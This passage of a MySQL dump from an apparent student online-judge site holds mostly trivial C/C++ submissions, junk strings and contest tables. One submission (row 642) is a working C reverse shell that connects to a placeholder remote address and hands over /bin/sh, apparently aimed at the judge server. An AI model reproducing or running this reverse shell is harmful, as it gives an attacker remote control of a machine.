('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 507),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 508),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2;\r\n}', 509),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2;\r\n}', 510),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2;\r\n}', 511),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2;\r\n}', 512),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 513),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 514),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 515),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 516),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 517),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 518),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 519),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 520),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 521),
('bala', 'sdfghjhasdf', 522),
('bala', 'sdfghjhasdf', 523),
('bala', 'sdfghjhasdf', 524),
('bala', 'sdfghjhasdf', 525),
('bala', 'sdfghjhasdf', 526),
('bala', 'sdfghjhasdf', 527),
('bala', 'dfxghjfwertyujhgfdsadcvbn', 528),
('bala', 'dfxghjfwertyujhgfdsadcvbn', 529),
('bala', 'dfxghjfwertyujhgfdsadcvbn', 530),
('bala', 'dfxghjfwertyujhgfdsadcvbn', 531),
('bala', 'dfxghjfwertyujhgfdsadcvbn', 532),
('bala', 'dfxghjfwertyujhgfdsadcvbn', 533),
('bala', 'sdfvbn', 534),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nint a;\r\ncin>>a;\r\ncout<<a;\r\n}', 535),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 536),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 537),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 538),
('3', 'vadsgbd', 539),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 540),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 541),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<;\r\n	return 0;\r\n}', 542),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<end\r\n	return 0;\r\n}', 543),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 544),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 545),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 546),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 547),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 548),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 549),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 550),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 551),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 552),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 553),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 554),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 555),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 556),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 557),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 558),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 559),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 560),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 561),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 562),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 563),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 564),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 565),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 566),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 567),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 568),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 569),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 570),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 571),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 572),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 573),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 574),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 575),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 576),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 577),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 578),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 579),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 580),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 581),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 582),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 583),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 584),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 585),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 586),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 587),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 588),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<h1\r\n	return 0;\r\n}', 589),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<end\r\n	return 0;\r\n}', 590),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 591),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 592),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"\r\n	return 0;\r\n}', 593),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 594),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 595),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 596),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 597),
('1', 'nakxnj', 598),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 599),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 600),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 601),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 602),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 603),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 604),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 605),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 606),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 607),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 608),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 609),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 610),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 611),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 612),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 613),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 614),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 615),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 616),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 617),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 618),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 619),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 620),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 621),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\");\r\n}', 622),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 623),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 624),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 625),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 626),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 627),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 628),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 629),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 630),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\");\r\n}', 631),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 632),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 633),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nwhile(1)\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 634),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nwhile(1)\r\n{\r\n}\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 635),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<100000)\r\n{\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 636),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(1)\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n\r\n	return 0;\r\n}', 637),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(1)\r\n{\r\n}\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n\r\n	return 0;\r\n}', 638),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(1)\r\n{\r\n}\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n\r\n	return 0;\r\n}', 639),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(1);\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n\r\n	return 0;\r\n}', 640),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(1)\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n\r\n	return 0;\r\n}', 641),
('shaswata56', '#include <stdio.h>\r\n#include <unistd.h>\r\n#include <netinet/in.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n\r\n#define REMOTE_ADDR \"XXX.XXX.XXX.XXX\"\r\n#define REMOTE_PORT XXX\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n    struct sockaddr_in sa;\r\n    int s;\r\n\r\n    sa.sin_family = AF_INET;\r\n    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);\r\n    sa.sin_port = htons(REMOTE_PORT);\r\n\r\n    s = socket(AF_INET, SOCK_STREAM, 0);\r\n    connect(s, (struct sockaddr *)&sa, sizeof(sa));\r\n    dup2(s, 0);\r\n    dup2(s, 1);\r\n    dup2(s, 2);\r\n\r\n    execve(\"/bin/sh\", 0, 0);\r\n    return 0;\r\n}', 642),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 643),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 644),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"16\"<<endl;\r\ncout<<26<<endl;\r\n	return 0;\r\n}', 645),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"16\"<<endl;\r\ncout<<26<<endl;\r\n	return 0;\r\n}', 646),
('RakibulRanak', 'qsz', 647),
('RakibulRanak', 'a', 648),
('RakibulRanak', 'qefEG', 649),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\n}', 650),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\n}', 651),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main()\r\n{\r\n   printf(\"16\n26\n\");\r\n}', 652),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 653),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 654),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello\"<<endl;\r\n	return 0;\r\n}', 655),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello\";\r\n	return 0;\r\n}', 656),
('RakibulRanak', '#include<iostream>\r\nusing namespace std; int t,a,b,c,n; main(){for(cin>>t;t--;puts((a+b+c+n)%3||(a+b+c+n)/3<max(a,max(b,c))?\"NO\":\"YES\")) cin>>a>>b>>c>>n;}', 657),
('RakibulRanak', '#include <bits/stdc++.h>\r\nconst double PI  =3.141592653589793238463; \r\nusing namespace std;\r\ntypedef long long ll;\r\n#define ff first\r\n#define ss second\r\n#define pb push_back\r\n#define pf push_front\r\n#define mp make_pair\r\n#define pu push\r\n#define pp pop_back\r\n#define in insert\r\n#define MOD 1000000007\r\n#define endl \"\n\"\r\n#define sz(a) (int)((a).size())\r\n#define all(x) (x).begin(), (x).end()\r\n#define trace(x) cerr << #x << \": \" << x << \" \" << endl;\r\n#define prv(a) for(auto x : a) cout << x << \' \';cout << \'\n\';\r\n#define IOS ios::sync_with_stdio(0); cin.tie(0); cout.tie(0);\r\n#define OTP(s) cout<<s<<endl;\r\n#define FOR(i,j,k,l) for(ll i=j;i<k;i+=l)\r\n#define REP(i,j) FOR(i,0,j,1)\r\ninline ll add(ll a, ll b){a += b; if(a >= MOD)a -= MOD; return a;}\r\ninline ll sub(ll a, ll b){a -= b; if(a < 0)a += MOD; return a;}\r\ninline ll mul(ll a, ll b){return (ll)((ll) a * b %MOD);}\r\ntypedef vector<ll> vl;\r\ntypedef vector<vl> vvl;\r\ntypedef pair<ll,ll> pll;\r\ntypedef vector<pll> vpll;\r\nlong long fast_power(long long base, long long power) {\r\n    long long result = 1;\r\n    while(power > 0) {\r\n \r\n        if(power % 2 == 1) { // Can also use (power & 1) to make code even faster\r\n            result = (result*base)%MOD;\r\n        }\r\n        base = (base * base)%MOD;\r\n        power = power / 2; // Can also use power >>= 1; to make code even faster\r\n    }\r\n    return result;\r\n}\r\n/*ll min(ll a,ll b)\r\n{\r\n    return a>b?b:a;\r\n}*/\r\nll max(ll a,ll b)\r\n{\r\n    return a>b?a:b;\r\n}\r\nvoid SieveOfEratosthenes(ll n, unordered_set<ll> &s,ll k) \r\n{ \r\n    // Create a boolean array \"prime[0..n]\" and initialize \r\n    // all entries it as true. A value in prime[i] will \r\n    // finally be false if i is Not a prime, else true. \r\n    bool prime[n+1]; \r\n    memset(prime, true, sizeof(prime)); \r\n  \r\n    for (int p=2; p*p<=n; p++) \r\n    { \r\n        // If prime[p] is not changed, then it is a prime \r\n        if (prime[p] == true) \r\n        { \r\n            // Update all multiples of p greater than or  \r\n            // equal to the square of it \r\n            // numbers which are multiple of p and are \r\n            // less than p^2 are already been marked.  \r\n            for (int i=p*p; i<=n; i += p) \r\n                prime[i] = false; \r\n        } \r\n    } \r\n  \r\n    // store all prime squares \r\n    for (ll p=2; fast_power(p,k)<=n; p++) \r\n       if (prime[p]) s.insert(fast_power(p,k)); \r\n}\r\n \r\nint main() \r\n{\r\n    IOS\r\n    ll t;\r\n    cin>>t;\r\n    while(t--)\r\n    {\r\n        ll a,b,c,n;\r\n        cin>>a>>b>>c>>n;\r\n        ll m1=max(max(a,b),c);\r\n        if((a+b+c+n)%3==0 && (a+b+c+n)/3>=m1)\r\n        {\r\n            cout<<\"YES\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            cout<<\"NO\"<<endl;\r\n        }\r\n    }\r\n}\r\n \r\n', 658),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nwhile(1)\r\n{\r\ncout<<\"HI\"<<endl;\r\n}\r\n}', 659),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\nsystem;\r\n}', 660),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\nsystem\r\n}', 661),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\nsystem\r\n}', 662),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\nsystem\r\n}', 663),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\nchanged\r\n}', 664),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\nchanged\r\n}', 665),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\nSystem\r\n}', 666),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<16<<endl<<26<<endl;\r\n}', 667);

-- --------------------------------------------------------

--
-- Table structure for table `contest`
--

CREATE TABLE `contest` (
  `id` int(11) NOT NULL,
  `cname` varchar(4000) DEFAULT NULL,
  `start_at` datetime DEFAULT NULL,
  `end_at` datetime DEFAULT NULL,
  `date_on` date DEFAULT NULL,
  `owner` varchar(100) DEFAULT 'shawon',
  `pass` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `contest`
--

INSERT INTO `contest` (`id`, `cname`, `start_at`, `end_at`, `date_on`, `owner`, `pass`) VALUES
(1, 'balamoy', '2017-06-24 02:05:07', '2020-01-24 05:05:09', '2020-01-24', 'RakibulRanak', NULL),
(2, 'balamoy2', '2020-01-23 19:09:27', '2020-01-23 19:09:29', '2020-01-23', 'RakibulRanak', NULL),
(3, 'swe17', '2020-01-23 19:20:07', '2017-06-16 10:30:07', '2020-01-23', 'RakibulRanak', NULL),
(4, 'SWEXD', '2020-01-24 01:10:34', '2020-01-24 02:10:51', '2020-01-24', 'RakibulRanak', NULL),
(5, 'contest60', '2020-01-24 03:30:20', '2020-01-24 03:35:32', '2020-01-24', 'RakibulRanak', NULL),
(6, 'sure', '2020-01-24 22:00:10', '2020-01-26 17:30:10', '2020-01-24', 'RakibulRanak', NULL),
(9, 'finally', '2020-01-28 01:40:26', '2020-01-28 01:50:37', '2020-01-28', 'RakibulRanak', 'vvv');

-- --------------------------------------------------------

--
-- Table structure for table `contestproblems`
--

CREATE TABLE `contestproblems` (
  `id` int(11) DEFAULT NULL,
  `cname` varchar(50) NOT NULL,
  `pbname` varchar(400) DEFAULT NULL,
  `pbdes` longtext DEFAULT NULL,
  `pbauthor` varchar(100) DEFAULT NULL,
  `tc` longtext DEFAULT NULL,
  `output` longtext DEFAULT NULL,
  `uoutput` longtext DEFAULT NULL,
  `pbid` int(12) NOT NULL,
  `tlimit` double(100,2) DEFAULT 3.00,
  `sts` tinyint(1) DEFAULT 2
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `contestproblems`
--

INSERT INTO `contestproblems` (`id`, `cname`, `pbname`, `pbdes`, `pbauthor`, `tc`, `output`, `uoutput`, `pbid`, `tlimit`, `sts`) VALUES
(1, 'balamoy', 'B', 'qsacda', 'RakibulRanak', 'asxc', 'wdc\r\n', 'wdc\n', 2, 1.00, 2),
(1, 'balamoy', 'A', 'wdcc', 'RakibulRanakx', 'wcd', 'wdx', '', 3, 1.00, 2),
(1, 'balamoy', 'A', 'wdcc', 'RakibulRanakx', 'wcd', 'wdx', '', 4, 1.00, 2),
